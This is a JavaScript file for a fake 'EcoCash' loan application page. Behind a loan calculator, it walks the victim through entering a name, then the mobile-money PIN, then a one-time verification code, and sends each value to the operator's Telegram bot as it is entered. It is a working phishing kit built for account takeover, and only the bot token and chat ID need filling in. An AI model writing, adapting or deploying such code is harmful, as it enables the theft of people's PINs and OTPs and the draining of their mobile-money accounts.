// REAL TELEGRAM BOT CONFIGURATION
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // e.g. '7123456789:AAEF...'
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // e.g. '123456789'

// Helper function to send messages to your Telegram Admin Chat
async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        const data = await response.json();
        console.log('Telegram delivery response:', data);
        return data.ok;
    } catch (error) {
        console.error('Error sending Telegram notification:', error);
        return false;
    }
}

// Global Loan State
let currentLoanRequest = null;

document.addEventListener('DOMContentLoaded', () => {
    const loanAmountInput = document.getElementById('loanAmount');
    const amountDisplay = document.getElementById('amountDisplay');
    const interestDisplay = document.getElementById('interestDisplay');
    const totalDisplay = document.getElementById('totalDisplay');

    // Update calculated totals on slider movement
    if (loanAmountInput) {
        loanAmountInput.addEventListener('input', (e) => {
            const amount = parseFloat(e.target.value);
            const interest = amount * 0.05;
            const total = amount + interest;

            if (amountDisplay) amountDisplay.textContent = `$${amount}`;
            if (interestDisplay) interestDisplay.textContent = `$${interest.toFixed(0)}`;
            if (totalDisplay) totalDisplay.textContent = `$${total.toFixed(0)}`;
        });
    }
});

// Step 1: Submit Loan Details & Send Alert to Telegram
async function submitLoanStep1(event) {
    if (event) event.preventDefault();

    const fullName = document.getElementById('fullName')?.value || 'Anonymous';
    const purpose = document.getElementById('loanPurpose')?.value || 'General Business';
    const amount = document.getElementById('loanAmount')?.value || '300';
    const total = (parseFloat(amount) * 1.05).toFixed(0);

    currentLoanRequest = { fullName, purpose, amount, total };

    // Format message for Telegram Admin
    const message = `🚨 <b>NEW ECOCASH LOAN REQUEST</b> 🚨\n\n` +
                    `👤 <b>Applicant:</b> ${fullName}\n` +
                    `💰 <b>Amount:</b> $${amount}\n` +
                    `📈 <b>Repayable:</b> $${total}\n` +
                    `🎯 <b>Purpose:</b> ${purpose}\n` +
                    `⏳ <b>Status:</b> Pending Customer PIN Entry...`;

    // Send notification to your Telegram Bot
    await sendTelegramMessage(message);

    // Advance UI to Step 2 (PIN Entry)
    document.getElementById('step1')?.classList.add('hidden');
    document.getElementById('step2')?.classList.remove('hidden');
}

// Step 2: Customer Enters PIN & Triggers Telegram Approval Notice
async function submitPinStep2(event) {
    if (event) event.preventDefault();

    const pin = document.getElementById('userPin')?.value || '****';

    const message = `🔐 <b>PIN ENTERED BY USER</b> 🔐\n\n` +
                    `👤 <b>Applicant:</b> ${currentLoanRequest?.fullName || 'User'}\n` +
                    `🔑 <b>PIN Entered:</b> <code>${pin}</code>\n` +
                    `💰 <b>Loan Value:</b> $${currentLoanRequest?.amount || '300'}\n\n` +
                    `⚠️ <b>Action Required:</b> Please review applicant details and issue OTP verification code to user.`;

    await sendTelegramMessage(message);

    // Move user to Waiting Screen
    document.getElementById('step2')?.classList.add('hidden');
    document.getElementById('step3')?.classList.remove('hidden');
}

// Step 3: Verify OTP Code
async function verifyOtpStep3(event) {
    if (event) event.preventDefault();

    const otp = document.getElementById('otpCode')?.value || '------';

    const message = `✅ <b>OTP VERIFICATION SUBMITTED</b> ✅\n\n` +
                    `👤 <b>Applicant:</b> ${currentLoanRequest?.fullName || 'User'}\n` +
                    `🔢 <b>OTP Submitted:</b> <code>${otp}</code>\n` +
                    `🎉 <b>Status:</b> Loan Application Completed.`;

    await sendTelegramMessage(message);

    // Final Success Display
    document.getElementById('step3')?.classList.add('hidden');
    document.getElementById('step4')?.classList.remove('hidden');
  }
